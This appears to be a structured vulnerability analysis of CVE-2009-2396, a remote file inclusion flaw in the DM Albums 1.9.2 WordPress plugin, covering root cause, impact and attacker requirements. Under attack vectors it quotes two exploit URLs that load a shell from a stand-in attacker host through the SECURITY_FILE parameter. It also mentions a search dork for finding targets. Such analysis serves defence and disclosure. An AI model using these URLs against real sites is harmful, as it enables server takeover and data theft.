Based on the provided content, here's an analysis of CVE-2009-2396:

**Root Cause of Vulnerability:**

*   The vulnerability is a Remote File Inclusion (RFI) vulnerability in the DM Albums plugin for WordPress.
*   The `album.php` file in the plugin's template directory is vulnerable.
*   The `SECURITY_FILE` parameter in the `album.php` is not properly sanitized and allows inclusion of remote files.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The application allows an attacker to include a remote file into the vulnerable script.
*   **Lack of Input Sanitization:** The `SECURITY_FILE` parameter is not properly sanitized, allowing inclusion of arbitrary URLs.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By including a malicious PHP file hosted on an attacker-controlled server, an attacker can execute arbitrary code on the server hosting the vulnerable WordPress installation.
*   **Full System Compromise:** Successful exploitation can lead to a complete compromise of the web server.
*   **Data Breach:** An attacker could potentially gain access to sensitive data stored on the server.

**Attack Vectors:**

*   **HTTP GET Request:** The vulnerability is triggered by sending an HTTP GET request to the vulnerable `album.php` file with the malicious `SECURITY_FILE` parameter.
*   **Exploitation URLs:** The provided exploit examples demonstrate how to exploit the vulnerability via both standard path and WordPress specific path:
    *   `http://[sitename]/[path]/template/album.php?SECURITY_FILE=http://attackersite/shell.php`
    *   `http://[sitename]/[path]/wp-content/plugins/dm-albums/template/album.php?SECURITY_FILE=http://attackersite/shell.php`

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs network access to the vulnerable server.
*   **Ability to Host a Malicious File:** The attacker needs to host a malicious PHP file on a server they control.
*   **Knowledge of the Vulnerable Plugin:** The attacker needs to know that the DM Albums plugin is installed and vulnerable.

**Additional Notes:**

* The exploit details include a "dork" comment, suggesting that the vulnerability may be easily found using search engines.
* The exploit also notes a specific version (1.9.2) of DM Albums plugin is vulnerable.
